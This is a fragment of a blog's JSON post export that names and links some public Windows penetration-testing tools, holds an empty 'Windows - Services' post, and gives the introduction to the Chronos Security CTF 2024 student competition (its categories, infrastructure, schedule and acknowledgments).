href=\"https://github.com/antonioCoco/RoguePotato\">https://github.com/antonioCoco/RoguePotato</a></td>\n</tr>\n<tr>\n<td>Watson - privesc based on missing KBs</td>\n<td><a href=\"https://github.com/rasta-mouse/Watson\">https://github.com/rasta-mouse/Watson</a></td>\n</tr>\n<tr>\n<td>PowerSploit - PowerShell post-exploitation</td>\n<td><a href=\"https://github.com/PowerShellMafia/PowerSploit\">https://github.com/PowerShellMafia/PowerSploit</a></td>\n</tr>\n<tr>\n<td>BloodHound - Six degrees of Domain Admin</td>\n<td><a href=\"https://github.com/BloodHoundAD/BloodHound\">https://github.com/BloodHoundAD/BloodHound</a></td>\n</tr>\n</tbody></table>\n<br>\n\n<hr>\n<hr>"},{"title":"Windows - Services","date":"2024-08-03T09:00:00.000Z","toc":true,"_content":"\n---\n.\n\n---\n<!-- more -->\n\n## \n\n<br>\n\n---\n---","source":"_posts/Pentesting/Windows/services.md","raw":"---\ntitle: Windows - Services\ndate: 2024-08-03 12:00:00\ncategories:\n  - Pentesting\n  - Windows\ntags:\n  - Pentesting\n  - Windows\ntoc: true\n---\n\n---\n.\n\n---\n<!-- more -->\n\n## \n\n<br>\n\n---\n---","slug":"Pentesting/Windows/services","published":1,"updated":"2024-09-23T06:18:55.878Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmi6001y6gvg1mh1frfv","content":"<hr>\n<p>.</p>\n<hr>\n<span id=\"more\"></span>\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<p>.</p>\n<hr>","more":"<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><br>\n\n<hr>\n<hr>"},{"title":"0. CSCTF 2024 - Introduction","toc":true,"_content":"\n---\n> What is CSCTF 2024, how it all started, how I created it, how well it went, and what is coming.\n\n---\n<!-- more -->\n\n<br>\n\n##  Quick start\n\nWelcome to **Chronos Security CTF 2024**!\n\nThe **CSCTF 2024** represents an exclusive national cybersecurity competition, welcoming participation from students and pupils of Romania's military and civilian educational system. After months of work, days of management, dozens of hours of debugging, and numerous unsuccessful attempts, I am thrilled to announce the completion of this project!\n\nAt the time of writing I am [**sd. plt. maj. Marin Radu**](https://www.armyacademy.ro/ev_2023_10_27.php), a final-year student at the [\"Nicolae Blcescu\" Land Forces Academy](https://www.armyacademy.ro/engleza/), and I organized and led this initiative, serving both as an exhilarating cybersecurity challenge and an exhaustive bachelor thesis project.\n\n\n<br>\n<br>\n\n##  Overview\n\n### Challenges\n- Difficulty levels range from **easy** to **hard** (`easy`, `medium`, `hard`)\n- Approximately **70 diverse challenges** assessing skills across various categories\n\n|  |  |  |  |\n| :----: | :----: | :----: | :----: |\n| Cryptography | Forensics | Linux | Miscellaneous |\n| OSINT | Programming | Pwn | Reverse Engineering | \n| Steganography | Web | Windows | |\n\n<br>\n\n### Infrastructure\n\n- **Google Cloud Platform** - cloud hosting, management, monitoring and more\n- **Cloudflare** - domain management\n- **Kubernetes** and **Docker** - container orchestration\n- **CTFd** - CTF framework \n- **Discord** - community server\n- **Notion** - notes and ideas\n- **GitHub** - repository to store source code\n- **SendGrid** - SMTP server for mail management\n<!-- - **Ansible** and **GitHub actions** for automation and CI/CD -->\n<!-- - **Splunk** for log management -->\n<!-- - **Prometheus** for monitoring and alerting -->\n<!-- - **PfSense** for networking and monitoring -->\n\n<br>\n\n### Knowledge requirements\n- **Scripting languages**: bash, python\n- **Virtualization**: docker, kubernetes\n- **Networking background**: TCP/IP stack, iptables, DNS, proxy, subnetting, routing \n- **Troubleshooting skills on various systems**, including: web, database, mail, unix machines \n- **Miscellaneous**: english proficiency, curiosity, perseverance, management, adaptability \n\n<br>\n\n### Competition Details\n- Website: [ctf.chronossec.site](https://ctf.chronossec.site)\n- Registration period: **01-29.03.2024**\n- Competition period: **29-31.03.2024**\n- CTF type: **jeopardy**\n- CTF mode: **teams**\n- Participation: **online**\n- Team size: **2-5 players**\n- Difficulty level: **beginner-intermediate**\n- Expected number of participants: **150-200**\n\n<br>\n\n### Participation requirements\n- Curiosity, perseverance, basic English understanding, Google, and an internet connection \n- Linux virtual machine (Kali is preferred)\n\n\n<br>\n<br>\n\n##  Development\n\n### Timeline\n- The development spanned almost **9 months** (Jul 2023 - March 2024).\n- Average dedication of **5 hours per day**.\n\n<br>\n\n### Second CTF\nThis marks the second CTF I've ever created, following the successful \"<a href=\"https://github.com/ChronosPK/SMCC-2023\" target=\"_blank\">SMCC 2023</a>\" event held in March that year.\n\n\n<br>\n<br>\n\n##  Participation\n\n### How to Participate\n- Visit <a href=\"https://ctf.chronossec.site/\" target=\"_blank\">the official CTF platform</a> to register and participate.\n\n<br>\n\n### Important Dates\n- Registration period: **01.03.2024 - 29.03.2024**\n- CTF timeline: **29.03.2024 - 31.03.2024** (starting and ending at 13:00 UTC+2) \n\n<br>\n<br>\n\n##  Acknowledgments\n\nThe organization and creation of this contest represented a real challenge, \nbut it could not have reached this stage without the help of the following people:\n\n- **Marketing Manager**: Andrei Bodnari (AFT Sibiu)\n- **Challenge Contributors**: \n  - Mihai Cujb (Bitdefender)\n  - Drago Stratulat (CApC Bucureti)\n- **Bachelor's Advisors**:\n  - Prof. Univ. Dr. Ing. Simona Miclu (AFT Sibiu)\n  - Lt. col. dr. ing. Vlad Vasile (SICTIAC Sibiu)\n  - Lt. drd. Alexandru Romaniuc (SICTIAC Sibiu)\n\n\n<br>\n<br>\n\n<!-- ##  Sponsors\n\n**A special thanks to our sponsors for their generous support**:\n\n<br>\n\n<table style=\"border-collapse: collapse; width: 100%;\">\n  <tbody>\n    <tr>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/cadets-corps.png\" style=\"height:80px;\" /></a></td>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/pentest-tools.png\" style=\"height:80px;\" /></a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/bit-sentinel.png\" style=\"height:80px;\" /></a></td>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/cyber-edu.png\" style=\"height:80px;\" /></a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/bit-defender.png\" style=\"height:80px;\" /></a></td>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/visma.png\" style=\"height:80px;\" /></a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/ntt-data.png\" style=\"height:80px;\" /></a></td>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/refresh-cleaning.jpg\" style=\"height:80px;\" /></a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"\" style=\"height:80px;\" /></a></td>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"\" style=\"height:80px;\" /></a></td>\n    </tr>\n  </tbody>\n</table> \n\n<br>\n<br> -->\n\n##  Licensing and Authorship\n\nThis project, Chronos Security CTF 2024, is a culmination of my efforts and dedication as its sole organizer and primary creator. I have documented the entire development process, the challenges, and the infrastructure setup in the <a href=\"https://github.com/ChronosPK/CSCTF-2024\" target=\"_blank\"><b>GitHub repository</b></a> associated with this competition. The repository and all its contents are licensed under the MIT License, available for review <a href=\"https://github.com/ChronosPK/CSCTF-2024/blob/main/LICENSE.txt\" target=\"_blank\"><b>here</b></a>. This license permits others to use, modify, and distribute the project in a manner that is consistent with the free and open-source ethos, provided that proper credit is given.\n\nCopyright Notice: <b>` [2024] Radu Marin. All rights reserved`</b>. This copyright notice applies to all proprietary content on the blog, the competition website, and the GitHub repository unless otherwise stated.\n\nThe successful execution of this project was supported by invaluable contributions from individuals within the cybersecurity and educational community. Their roles and contributions are acknowledged here.\n\nORCID ID: `...`\n\nFor any inquiries, suggestions, or collaborations, please refer to the contact page. Your feedback and questions are always welcome as we together foster a learning and engaging environment through this competition.\n<br>\n<br>\n\n##  Additional Resources\n\n- <a href=\"\" target=\"_blank\">Guide - creating Chronos Security CTF 2024</a>\n- <a href=\"https://ctf.chronossec.site\" target=\"_blank\">CSCTF 2024 official page</a>\n\n<br>\n\n---\n---","source":"_posts/CTFs/CSCTF 2024/0. Introduction/index.md","raw":"---\ntitle: 0. CSCTF 2024 - Introduction\ncategories:\n  - CTFs\n  - CSCTF 2024\n  - 0. Introduction\ntags:\n  - CTFs\n  - CSCTF 2024\n  - How to organize a CTF competition\ntoc: true\n---\n\n---\n> What is CSCTF 2024, how it all started, how I created it, how well it went, and what is coming.\n\n---\n<!-- more -->\n\n<br>\n\n##  Quick start\n\nWelcome to **Chronos Security CTF 2024**!\n\nThe **CSCTF 2024** represents an exclusive national cybersecurity competition, welcoming participation from students and pupils of Romania's military and civilian educational system. After months of work, days of management, dozens of hours of debugging, and numerous unsuccessful attempts, I am thrilled to announce the completion of this project!\n\nAt the time of writing I am [**sd. plt. maj. Marin Radu**](https://www.armyacademy.ro/ev_2023_10_27.php), a final-year student at the [\"Nicolae Blcescu\" Land Forces Academy](https://www.armyacademy.ro/engleza/), and I organized and led this initiative, serving both as an exhilarating cybersecurity challenge and an exhaustive bachelor thesis project.\n\n\n<br>\n<br>\n\n##  Overview\n\n### Challenges\n- Difficulty levels range from **easy** to **hard** (`easy`, `medium`, `hard`)\n- Approximately **70 diverse challenges** assessing skills across various categories\n\n|  |  |  |  |\n| :----: | :----: | :----: | :----: |\n| Cryptography | Forensics | Linux | Miscellaneous |\n| OSINT | Programming | Pwn | Reverse Engineering | \n| Steganography | Web | Windows | |\n\n<br>\n\n### Infrastructure\n\n- **Google Cloud Platform** - cloud hosting, management, monitoring and more\n- **Cloudflare** - domain management\n- **Kubernetes** and **Docker** - container orchestration\n- **CTFd** - CTF framework \n- **Discord** - community server\n- **Notion** - notes and ideas\n- **GitHub** - repository to store source code\n- **SendGrid** - SMTP server for mail management\n<!-- - **Ansible** and **GitHub actions** for automation and CI/CD -->\n<!-- - **Splunk** for log management -->\n<!-- - **Prometheus** for monitoring and alerting -->\n<!-- - **PfSense** for networking and monitoring -->\n\n<br>\n\n### Knowledge requirements\n- **Scripting languages**: bash, python\n- **Virtualization**: docker, kubernetes\n- **Networking background**: TCP/IP stack, iptables, DNS, proxy, subnetting, routing \n- **Troubleshooting skills on various systems**, including: web, database, mail, unix machines \n- **Miscellaneous**: english proficiency, curiosity, perseverance, management, adaptability \n\n<br>\n\n### Competition Details\n- Website: [ctf.chronossec.site](https://ctf.chronossec.site)\n- Registration period: **01-29.03.2024**\n- Competition period: **29-31.03.2024**\n- CTF type: **jeopardy**\n- CTF mode: **teams**\n- Participation: **online**\n- Team size: **2-5 players**\n- Difficulty level: **beginner-intermediate**\n- Expected number of participants: **150-200**\n\n<br>\n\n### Participation requirements\n- Curiosity, perseverance, basic English understanding, Google, and an internet connection \n- Linux virtual machine (Kali is preferred)\n\n\n<br>\n<br>\n\n##  Development\n\n### Timeline\n- The development spanned almost **9 months** (Jul 2023 - March 2024).\n- Average dedication of **5 hours per day**.\n\n<br>\n\n### Second CTF\nThis marks the second CTF I've ever created, following the successful \"<a href=\"https://github.com/ChronosPK/SMCC-2023\" target=\"_blank\">SMCC 2023</a>\" event held in March that year.\n\n\n<br>\n<br>\n\n##  Participation\n\n### How to Participate\n- Visit <a href=\"https://ctf.chronossec.site/\" target=\"_blank\">the official CTF platform</a> to register and participate.\n\n<br>\n\n### Important Dates\n- Registration period: **01.03.2024 - 29.03.2024**\n- CTF timeline: **29.03.2024 - 31.03.2024** (starting and ending at 13:00 UTC+2) \n\n<br>\n<br>\n\n##  Acknowledgments\n\nThe organization and creation of this contest represented a real challenge, \nbut it could not have reached this stage without the help of the following people:\n\n- **Marketing Manager**: Andrei Bodnari (AFT Sibiu)\n- **Challenge Contributors**: \n  - Mihai Cujb (Bitdefender)\n  - Drago Stratulat (CApC Bucureti)\n- **Bachelor's Advisors**:\n  - Prof. Univ. Dr. Ing. Simona Miclu (AFT Sibiu)\n  - Lt. col. dr. ing. Vlad Vasile (SICTIAC Sibiu)\n  - Lt. drd. Alexandru Romaniuc (SICTIAC Sibiu)\n\n\n<br>\n<br>\n\n<!-- ##  Sponsors\n\n**A special thanks to our sponsors for their generous support**:\n\n<br>\n\n<table style=\"border-collapse: collapse; width: 100%;\">\n  <tbody>\n    <tr>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/cadets-corps.png\" style=\"height:80px;\" /></a></td>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/pentest-tools.png\" style=\"height:80px;\" /></a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/bit-sentinel.png\" style=\"height:80px;\" /></a></td>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/cyber-edu.png\" style=\"height:80px;\" /></a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/bit-defender.png\" style=\"height:80px;\" /></a></td>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/visma.png\" style=\"height:80px;\" /></a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/ntt-data.png\" style=\"height:80px;\" /></a></td>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/refresh-cleaning.jpg\" style=\"height:80px;\" /></a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"\" style=\"height:80px;\" /></a></td>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"\" style=\"height:80px;\" /></a></td>\n    </tr>\n  </tbody>\n</table> \n\n<br>\n<br> -->\n\n##  Licensing and Authorship\n\nThis project, Chronos Security CTF 2024, is a culmination of my efforts and dedication as its sole organizer and primary creator. I have documented the entire development process, the challenges, and the infrastructure setup in the <a href=\"https://github.com/ChronosPK/CSCTF-2024\" target=\"_blank\"><b>GitHub repository</b></a> associated with this competition. The repository and all its contents are licensed under the MIT License, available for review <a href=\"https://github.com/ChronosPK/CSCTF-2024/blob/main/LICENSE.txt\" target=\"_blank\"><b>here</b></a>. This license permits others to use, modify, and distribute the project in a manner that is consistent with the free and open-source ethos, provided that proper credit is given.\n\nCopyright Notice: <b>` [2024] Radu Marin. All rights reserved`</b>. This copyright notice applies to all proprietary content on the blog, the competition website, and the GitHub repository unless otherwise stated.\n\nThe successful execution of this project was supported by invaluable contributions from individuals within the cybersecurity and educational community. Their roles and contributions are acknowledged here.\n\nORCID ID: `...`\n\nFor any inquiries, suggestions, or collaborations, please refer to the contact page. Your feedback and questions are always welcome as we together foster a learning and engaging environment through this competition.\n<br>\n<br>\n\n##  Additional Resources\n\n- <a href=\"\" target=\"_blank\">Guide - creating Chronos Security CTF 2024</a>\n- <a href=\"https://ctf.chronossec.site\" target=\"_blank\">CSCTF 2024 official page</a>\n\n<br>\n\n---\n---","slug":"CTFs/CSCTF 2024/0. Introduction/index","published":1,"date":"2024-09-23T06:18:55.830Z","updated":"2024-09-23T06:18:55.831Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmi700226gvg4a7oef2s","content":"<hr>\n<blockquote>\n<p>What is CSCTF 2024, how it all started, how I created it, how well it went, and what is coming.</p>\n</blockquote>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n<h2 id=\"-Quick-start\"><a href=\"#-Quick-start\" class=\"headerlink\" title=\" Quick start\"></a> Quick start</h2><p>Welcome to <strong>Chronos Security CTF 2024</strong>!</p>\n<p>The <strong>CSCTF 2024</strong> represents an exclusive national cybersecurity competition, welcoming participation from students and pupils of Romanias military and civilian educational system. After months of work, days of management, dozens of hours of debugging, and numerous unsuccessful attempts, I am thrilled to announce the completion of this project!</p>\n<p>At the time of writing I am <a href=\"https://www.armyacademy.ro/ev_2023_10_27.php\"><strong>sd. plt. maj. Marin Radu</strong></a>, a final-year student at the <a href=\"https://www.armyacademy.ro/engleza/\">Nicolae Blcescu Land Forces Academy</a>, and I organized and led this initiative, serving both as an exhilarating cybersecurity challenge and an exhaustive bachelor thesis project.</p>\n<br>\n<br>\n\n<h2 id=\"-Overview\"><a href=\"#-Overview\" class=\"headerlink\" title=\" Overview\"></a> Overview</h2><h3 id=\"Challenges\"><a href=\"#Challenges\" class=\"headerlink\" title=\"Challenges\"></a>Challenges</h3><ul>\n<li>Difficulty levels range from <strong>easy</strong> to <strong>hard</strong> (<code>easy</code>, <code>medium</code>, <code>hard</code>)</li>\n<li>Approximately <strong>70 diverse challenges</strong> assessing skills across various categories</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">Cryptography</td>\n<td align=\"center\">Forensics</td>\n<td align=\"center\">Linux</td>\n<td align=\"center\">Miscellaneous</td>\n</tr>\n<tr>\n<td align=\"center\">OSINT</td>\n<td align=\"center\">Programming</td>\n<td align=\"center\">Pwn</td>\n<td align=\"center\">Reverse Engineering</td>\n</tr>\n<tr>\n<td align=\"center\">Steganography</td>\n<td align=\"center\">Web</td>\n<td align=\"center\">Windows</td>\n<td align=\"center\"></td>\n</tr>\n</tbody></table>\n<br>\n\n<h3 id=\"Infrastructure\"><a href=\"#Infrastructure\" class=\"headerlink\" title=\"Infrastructure\"></a>Infrastructure</h3><ul>\n<li><strong>Google Cloud Platform</strong> - cloud hosting, management, monitoring and more</li>\n<li><strong>Cloudflare</strong> - domain management</li>\n<li><strong>Kubernetes</strong> and <strong>Docker</strong> - container orchestration</li>\n<li><strong>CTFd</strong> - CTF framework </li>\n<li><strong>Discord</strong> - community server</li>\n<li><strong>Notion</strong> - notes and ideas</li>\n<li><strong>GitHub</strong> - repository to store source code</li>\n<li><strong>SendGrid</strong> - SMTP server for mail management<!-- - **Ansible** and **GitHub actions** for automation and CI/CD -->\n<!-- - **Splunk** for log management -->\n<!-- - **Prometheus** for monitoring and alerting -->\n<!-- - **PfSense** for networking and monitoring --></li>\n</ul>\n<br>\n\n<h3 id=\"Knowledge-requirements\"><a href=\"#Knowledge-requirements\" class=\"headerlink\" title=\"Knowledge requirements\"></a>Knowledge requirements</h3><ul>\n<li><strong>Scripting languages</strong>: bash, python</li>\n<li><strong>Virtualization</strong>: docker, kubernetes</li>\n<li><strong>Networking background</strong>: TCP&#x2F;IP stack, iptables, DNS, proxy, subnetting, routing </li>\n<li><strong>Troubleshooting skills on various systems</strong>, including: web, database, mail, unix machines </li>\n<li><strong>Miscellaneous</strong>: english proficiency, curiosity, perseverance, management, adaptability</li>\n</ul>\n<br>\n\n<h3 id=\"Competition-Details\"><a href=\"#Competition-Details\" class=\"headerlink\" title=\"Competition Details\"></a>Competition Details</h3><ul>\n<li>Website: <a href=\"https://ctf.chronossec.site/\">ctf.chronossec.site</a></li>\n<li>Registration period: <strong>01-29.03.2024</strong></li>\n<li>Competition period: <strong>29-31.03.2024</strong></li>\n<li>CTF type: <strong>jeopardy</strong></li>\n<li>CTF mode: <strong>teams</strong></li>\n<li>Participation: <strong>online</strong></li>\n<li>Team size: <strong>2-5 players</strong></li>\n<li>Difficulty level: <strong>beginner-intermediate</strong></li>\n<li>Expected number of participants: <strong>150-200</strong></li>\n</ul>\n<br>\n\n<h3 id=\"Participation-requirements\"><a href=\"#Participation-requirements\" class=\"headerlink\" title=\"Participation requirements\"></a>Participation requirements</h3><ul>\n<li>Curiosity, perseverance, basic English understanding, Google, and an internet connection </li>\n<li>Linux virtual machine (Kali is preferred)</li>\n</ul>\n<br>\n<br>\n\n<h2 id=\"-Development\"><a href=\"#-Development\" class=\"headerlink\" title=\" Development\"></a> Development</h2><h3 id=\"Timeline\"><a href=\"#Timeline\" class=\"headerlink\" title=\"Timeline\"></a>Timeline</h3><ul>\n<li>The development spanned almost <strong>9 months</strong> (Jul 2023 - March 2024).</li>\n<li>Average dedication of <strong>5 hours per day</strong>.</li>\n</ul>\n<br>\n\n<h3 id=\"Second-CTF\"><a href=\"#Second-CTF\" class=\"headerlink\" title=\"Second CTF\"></a>Second CTF</h3><p>This marks the second CTF Ive ever created, following the successful <a href=\"https://github.com/ChronosPK/SMCC-2023\" target=\"_blank\">SMCC 2023</a> event held in March that year.</p>\n<br>\n<br>\n\n<h2 id=\"-Participation\"><a href=\"#-Participation\" class=\"headerlink\" title=\" Participation\"></a> Participation</h2><h3 id=\"How-to-Participate\"><a href=\"#How-to-Participate\" class=\"headerlink\" title=\"How to Participate\"></a>How to Participate</h3><ul>\n<li>Visit <a href=\"https://ctf.chronossec.site/\" target=\"_blank\">the official CTF platform</a> to register and participate.</li>\n</ul>\n<br>\n\n<h3 id=\"Important-Dates\"><a href=\"#Important-Dates\" class=\"headerlink\" title=\"Important Dates\"></a>Important Dates</h3><ul>\n<li>Registration period: <strong>01.03.2024 - 29.03.2024</strong></li>\n<li>CTF timeline: <strong>29.03.2024 - 31.03.2024</strong> (starting and ending at 13:00 UTC+2)</li>\n</ul>\n<br>\n<br>\n\n<h2 id=\"-Acknowledgments\"><a href=\"#-Acknowledgments\" class=\"headerlink\" title=\" Acknowledgments\"></a> Acknowledgments</h2><p>The organization and creation of this contest represented a real challenge,<br>but it could not have reached this stage without the help of the following people:</p>\n<ul>\n<li><strong>Marketing Manager</strong>: Andrei Bodnari (AFT Sibiu)</li>\n<li><strong>Challenge Contributors</strong>: <ul>\n<li>Mihai Cujb (Bitdefender)</li>\n<li>Drago Stratulat (CApC Bucureti)</li>\n</ul>\n</li>\n<li><strong>Bachelors Advisors</strong>:<ul>\n<li>Prof. Univ. Dr. Ing. Simona Miclu (AFT Sibiu)</li>\n<li>Lt. col. dr. ing. Vlad Vasile (SICTIAC Sibiu)</li>\n<li>Lt. drd. Alexandru Romaniuc (SICTIAC Sibiu)</li>\n</ul>\n</li>\n</ul>\n<br>\n<br>\n\n<!-- ##  Sponsors\n\n**A special thanks to our sponsors for their generous support**:\n\n<br>\n\n<table style=\"border-collapse: collapse; width: 100%;\">\n  <tbody>\n    <tr>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/cadets-corps.png\" style=\"height:80px;\" /></a></td>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/pentest-tools.png\" style=\"height:80px;\" /></a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/bit-sentinel.png\" style=\"height:80px;\" /></a></td>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/cyber-edu.png\" style=\"height:80px;\" /></a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/bit-defender.png\" style=\"height:80px;\" /></a></td>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/visma.png\" style=\"height:80px;\" /></a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/ntt-data.png\" style=\"height:80px;\" /></a></td>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"/img/refresh-cleaning.jpg\" style=\"height:80px;\" /></a></td>\n    </tr>\n    <tr>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"\" style=\"height:80px;\" /></a></td>\n      <td style=\"text-align: center; vertical-align: middle; border: none;\"><a href=\"\" target=\"_blank\"><img src=\"\" style=\"height:80px;\" /></a></td>\n    </tr>\n  </tbody>\n</table> \n\n<br>\n<br> -->\n\n<h2 id=\"-Licensing-and-Authorship\"><a href=\"#-Licensing-and-Authorship\" class=\"headerlink\" title=\" Licensing and Authorship\"></a> Licensing and Authorship</h2><p>This project, Chronos Security CTF 2024, is a culmination of my efforts and dedication as its sole organizer and primary creator. I have documented the entire development process, the challenges, and the infrastructure setup in the <a href=\"https://github.com/ChronosPK/CSCTF-2024\" target=\"_blank\"><b>GitHub repository</b></a> associated with this competition. The repository and all its contents are licensed under the MIT License, available for review <a href=\"https://github.com/ChronosPK/CSCTF-2024/blob/main/LICENSE.txt\" target=\"_blank\"><b>here</b></a>. This license permits others to use, modify, and distribute the project in a manner that is consistent with the free and open-source ethos, provided that proper credit is given.</p>\n<p>Copyright Notice: <b><code> [2024] Radu Marin. All rights reserved</code></b>. This copyright notice applies to all proprietary content on the blog, the competition website, and the GitHub repository unless otherwise stated.</p>\n<p>The successful execution of this project was supported by invaluable contributions from individuals within the cybersecurity and educational community. Their roles and contributions are acknowledged here.</p>\n<p>ORCID ID: <code>...</code></p>\n<p>For any inquiries, suggestions, or collaborations, please refer to the contact page. Your feedback and questions are always welcome as we together foster a learning and engaging environment through this competition.<br><br><br><br></p>\n<h2 id=\"-Additional-Resources\"><a href=\"#-Additional-Resources\" class=\"headerlink\" title=\" Additional Resources\"></a> Additional Resources</h2><ul>\n<li><a href=\"\" target=\"_blank\">Guide - creating Chronos Security CTF 2024</a></li>\n<li><a href=\"https://ctf.chronossec.site\" target=\"_blank\">CSCTF 2024 official page</a></li>\n</ul>\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<blockquote>\n<p>What is CSCTF 2024, how it all started, how I created it, how well it went, and what is coming.</p>\n</blockquote>\n<hr>","more":"<br>\n\n<h2 id=\"-Quick-start\"><a href=\"#-Quick-start\" class=\"headerlink\" title=\" Quick start\"></a> Quick start</h2><p>Welcome to <strong>Chronos Security CTF 2024</strong>!</p>\n<p>The <strong>CSCTF 2024</strong> represents an exclusive national cybersecurity competition, welcoming participation from students and pupils of Romanias military and civilian educational system. After months of work, days of management, dozens of hours of debugging, and numerous unsuccessful attempts, I am thrilled to announce the completion of this project!</p>\n<p>At the time of writing I am <a href=\"https://www.armyacademy.ro/ev_2023_10_27.php\"><strong>sd. plt. maj. Marin Radu</strong></a>, a final-year student at the <a href=\"https://www.armyacademy.ro/engleza/\">Nicolae Blcescu Land Forces Academy</a>, and I organized and led this initiative, serving both as an exhilarating cybersecurity challenge and an exhaustive bachelor thesis project.</p>\n<br>\n<br>\n\n<h2 id=\"-Overview\"><a href=\"#-Overview\" class=\"headerlink\" title=\" Overview\"></a> Overview</h2><h3 id=\"Challenges\"><a href=\"#Challenges\" class=\"headerlink\" title=\"Challenges\"></a>Challenges</h3><ul>\n<li>Difficulty levels range from <strong>easy</strong> to <strong>hard</strong> (<code>easy</code>, <code>medium</code>, <code>hard</code>)</li>\n<li>Approximately <strong>70 diverse challenges</strong> assessing skills across various categories</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">Cryptography</td>\n<td align=\"center\">Forensics</td>\n<td align=\"center\">Linux</td>\n<td align=\"center\">Miscellaneous</td>\n</tr>\n<tr>\n<td align=\"center\">OSINT</td>\n<td align=\"center\">Programming</td>\n<td align=\"center\">Pwn</td>\n<td align=\"center\">Reverse Engineering</td>\n</tr>\n<tr>\n<td align=\"center\">Steganography</td>\n<td align=\"center\">Web</td>\n<td align=\"center\">Windows</td>\n<td align=\"center\"></td>\n</tr>\n</tbody></table>\n<br>\n\n<h3 id=\"Infrastructure\"><a href=\"#Infrastructure\" class=\"headerlink\" title=\"Infrastructure\"></a>Infrastructure</h3><ul>\n<li><strong>Google Cloud Platform</strong> - cloud hosting, management, monitoring and more</li>\n<li><strong>Cloudflare</strong> - domain management</li>\n<li><strong>Kubernetes</strong> and <strong>Docker</strong> - container orchestration</li>\n<li><strong>CTFd</strong> - CTF framework </li>\n<li><strong>Discord</strong> - community server</li>\n<li><strong>Notion</strong> - notes and ideas</li>\n<li><strong>GitHub</strong> - repository to store source code</li>\n<li><strong>SendGrid</strong> - SMTP server for mail management<!-- - **Ansible** and **GitHub actions** for automation and CI/CD -->\n<!-- - **Splunk** for log management -->\n<!-- - **Prometheus** for monitoring and alerting -->\n<!-- - **PfSense** for networking and monitoring --></li>\n</ul>\n<br>\n\n<h3 id=\"Knowledge-requirements\"><a href=\"#Knowledge-requirements\" class=\"headerlink\" title=\"Knowledge requirements\"></a>Knowledge requirements</h3><ul>\n<li><strong>Scripting languages</strong>: bash, python</li>\n<li><strong>Virtualization</strong>: docker, kubernetes</li>\n<li><strong>Networking background</strong>: TCP&#x2F;IP stack, iptables, DNS, proxy, subnetting, routing </li>\n<li><strong>Troubleshooting skills on various systems</strong>, including: web, database, mail, unix machines 